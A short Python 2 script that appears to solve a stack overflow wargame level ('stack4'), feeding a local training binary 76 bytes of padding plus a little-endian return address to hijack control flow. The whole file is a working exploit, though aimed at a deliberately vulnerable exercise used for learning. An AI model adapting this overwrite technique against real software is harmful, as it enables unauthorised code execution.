#!/usr/bin/env python2.6

from subprocess import Popen, PIPE

p = Popen("/home/adam/stack4",stdin=PIPE)

buff = "".join([l * 3 for l in "ABCDEFGHIJKLMNOPQRSTUVWXYZ"])

buff = buff[:len(buff) - 2]


flag = reversed('\x08\x04\x83\xf4')

payload = buff + "".join(flag)

print payload

p.communicate(payload)
